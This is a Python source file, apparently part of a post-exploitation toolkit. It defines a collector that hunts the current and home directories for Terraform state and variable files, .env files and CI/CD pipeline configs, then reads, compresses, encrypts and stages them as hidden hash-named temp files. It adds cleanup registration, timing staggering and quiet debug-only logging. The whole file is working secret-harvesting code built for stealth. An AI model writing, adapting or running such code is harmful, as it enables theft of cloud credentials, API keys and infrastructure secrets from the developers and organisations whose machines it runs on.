from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class IacCicdCollector(BaseCollector):
    """
    Collect IaC and CI/CD artifacts.
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        """Discover IaC and CI/CD artifacts."""
        search_patterns = {
            "terraform_state": ["*.tfstate", "*.tfstate.backup"],
            "terraform_vars": ["*.tfvars", "*.tfvars.json"],
            "dotenv": [".env", ".env.local", ".env.production", ".env.development"],
            "jenkins": ["Jenkinsfile"],
            "gitlab_ci": [".gitlab-ci.yml"],
            "azure_pipelines": ["azure-pipelines.yml"],
            "github_actions": [".github/workflows/*.yml"],
        }

        for root in (Path.cwd(), Path.home()):
            for artifact_subtype, patterns in search_patterns.items():
                for pattern in patterns:
                    for p in root.rglob(pattern):
                        if p.is_file():
                            yield ArtifactMetadata(
                                artifact_family="iac_cicd",
                                artifact_subtype=artifact_subtype,
                                source_path=str(p),
                                source_platform=os.name,
                                collection_method="file_read",
                            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        """Collect an IaC or CI/CD artifact."""
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "iac"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("IaC/CI/CD collection error (%s): %s", artifact.source_path, exc)
        return None
